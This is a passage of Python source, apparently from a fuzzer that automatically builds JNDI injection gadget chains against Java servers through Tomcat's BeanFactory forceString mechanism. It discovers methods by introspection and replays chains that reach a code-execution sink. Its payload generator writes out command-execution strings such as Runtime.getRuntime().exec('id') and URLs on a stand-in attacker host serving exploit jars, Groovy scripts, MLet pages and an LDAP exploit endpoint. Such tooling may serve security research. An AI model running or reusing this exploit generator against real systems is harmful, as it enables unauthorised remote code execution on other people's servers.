        """Classify a typed method as 'loader', 'executor', or 'unknown'.

        Uses return type + method name semantics to automatically detect
        2-step chain candidates without hardcoded method lists.
        """
        name = m["name"].lower()
        ret = m["return_type"]

        # Executor: returns Class/Object/Process/Connection (produces exploitable result)
        if ret in self._EXECUTOR_RETURN_TYPES:
            if any(p in name for p in self._EXECUTOR_NAME_PATTERNS):
                return "executor"

        # Loader: void return + setter/adder semantics (sets up state)
        if ret in self._LOADER_RETURN_TYPES:
            if any(p in name for p in self._LOADER_NAME_PATTERNS):
                return "loader"

        # Direct danger: any return, but dangerous name
        if any(p in name for p in ("eval", "exec", "run", "invoke", "call")):
            return "executor"

        return "unknown"

    def _method_introspect(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Generate forceString mutations from runtime-introspected methods.

        Uses typed method signatures from JndiTarget's reflection feedback.
        Automatically discovers 2-step chains by analyzing return types:
        - loader methods (void return, setter semantics): set up state
        - executor methods (Class/Object return): trigger exploitation

        If no introspection data exists yet, picks a random reference_class
        from the DB and sends it through BeanFactory to trigger introspection.
        """
        out = self._get_ir(ir)

        if self._introspected_methods:
            # Pick a class we have introspection data for.
            # Prefer classes with known sink reachability.
            reachable_classes = set()
            for (fac, ref, meth), info in self._reachability_map.items():
                if info.get("sinks_hit"):
                    reachable_classes.add(ref)
            introspected_keys = list(self._introspected_methods.keys())
            reachable_avail = [c for c in introspected_keys if c in reachable_classes]
            if reachable_avail and self.rng.random() < 0.7:
                ref_class = self.rng.choice(reachable_avail)
            else:
                ref_class = self.rng.choice(introspected_keys)
            methods = self._introspected_methods[ref_class]
            method_names = [m["name"] for m in methods]

            # Classify all methods by return type + name semantics
            loaders = [m for m in methods if self._classify_method(m) == "loader"]
            executors = [m for m in methods if self._classify_method(m) == "executor"]

            # Prioritize methods with known sink hits from reachability map
            sink_hit_names = set()
            for (f, r, mt), info in self._reachability_map.items():
                if r == ref_class and info.get("sinks_hit"):
                    sink_hit_names.add(mt)
            sink_hit_methods = [m for m in methods if m["name"] in sink_hit_names]

            # Dangerous methods by name pattern
            dangerous = [
                m for m in methods
                if any(p in m["name"].lower() for p in (
                    "eval", "exec", "run", "load", "parse", "invoke",
                    "call", "connect", "open", "lookup",
                ))
            ]

            out["factory_class"] = "org.apache.naming.factory.BeanFactory"
            out["reference_class"] = ref_class
            attrs = out.setdefault("factory_attrs", {})

            # Auto-discovered 2-step chain: loader(void) + executor(Class/Object)
            if loaders and executors:
                loader = self.rng.choice(loaders)
                executor = self.rng.choice(executors)
                attrs["forceString"] = f"a={loader['name']},b={executor['name']}"
                attrs["a"] = self._payload_for_method(loader["name"])
                attrs["b"] = self._payload_for_method(executor["name"])
                attrs.pop("x", None)
            else:
                # Single-step: pick best method
                if sink_hit_methods and self.rng.random() < 0.6:
                    chosen = self.rng.choice(sink_hit_methods)
                elif dangerous:
                    chosen = self.rng.choice(dangerous)
                else:
                    chosen = self.rng.choice(methods)
                attrs["forceString"] = f"x={chosen['name']}"
                attrs["x"] = self._payload_for_method(chosen["name"])
                attrs.pop("a", None)
                attrs.pop("b", None)

            return out

        else:
            # No introspection data yet — send an unexplored reference_class
            # through BeanFactory to trigger JndiTarget's introspection.
            all_ref_classes = set()
            for factory_info in FACTORY_DATABASE.values():
                ref_map = factory_info.get("reference_classes", {})
                for classes in ref_map.values():
                    all_ref_classes.update(classes)
                single = factory_info.get("reference_class")
                if single:
                    all_ref_classes.add(single)

            # Pick one we haven't introspected yet AND is not known-unavailable
            unexplored = [
                c for c in all_ref_classes
                if c not in self._introspected_methods
                and self._is_available(c)
            ]
            if not unexplored:
                return self._forcestring_mutate(ir, corpus)

            ref_class = self.rng.choice(unexplored)
            out["factory_class"] = "org.apache.naming.factory.BeanFactory"
            out["reference_class"] = ref_class
            attrs = out.setdefault("factory_attrs", {})
            attrs["forceString"] = "x=toString"
            attrs["x"] = ""
            return out

    def _payload_for_method(self, method_name: str) -> str:
        """Generate an appropriate payload string for a given method name."""
        low = method_name.lower()
        if "eval" in low or "exec" in low or "run" in low:
            return self.rng.choice(EL_PAYLOADS + GROOVY_PAYLOADS + BSH_PAYLOADS)
        if "load" in low and "class" in low:
            return "Exploit"
        if "parse" in low:
            return self.rng.choice([
                "'id'.execute()",
                "Runtime.getRuntime().exec('id')",
                "http://attacker.example/evil.groovy",
            ])
        if "addurl" in low or "addclass" in low:
            return "http://attacker.example/exploit.jar"
        if "mbean" in low:
            return "http://attacker.example/mlet.html"
        if "mkdir" in low:
            return "http:/127.0.0.1:1337/"
        if "loadlib" in low:
            return "/tmp/evil"
        if "connect" in low or "open" in low or "lookup" in low:
            return "ldap://attacker.example:1389/exploit"
        # Generic — try code execution
        return self.rng.choice([
            "Runtime.getRuntime().exec('id')",
            "http://attacker.example/exploit",
            "/tmp/pwned",
        ])

    # ------------------------------------------------------------------
    # J9: Replay successful — mutate payloads on sink-reaching chains
    # ------------------------------------------------------------------

    def _replay_successful(
        self, ir: dict[str, Any], corpus: list[Seed],
    ) -> dict[str, Any] | None:
        """Replay a (factory, ref_class, method) triple that reached a sink,
        but vary the payload to discover new exploitation paths."""
        if not self._reachability_map:
            return self._method_introspect(ir, corpus)

        # Filter to triples that actually hit sinks
        hit_triples = [
            (fac, ref, meth)
            for (fac, ref, meth), info in self._reachability_map.items()
            if info.get("sinks_hit")
        ]
        if not hit_triples:
            return self._method_introspect(ir, corpus)

        factory, ref_class, method = self.rng.choice(hit_triples)
        out = self._get_ir(ir)
        out["factory_class"] = factory
        out["reference_class"] = ref_class
        attrs = out.setdefault("factory_attrs", {})
        attrs["forceString"] = f"x={method}"
        attrs["x"] = self._payload_for_method(method)
        # Remove 2-step attrs if present
        attrs.pop("a", None)
        attrs.pop("b", None)
        return out
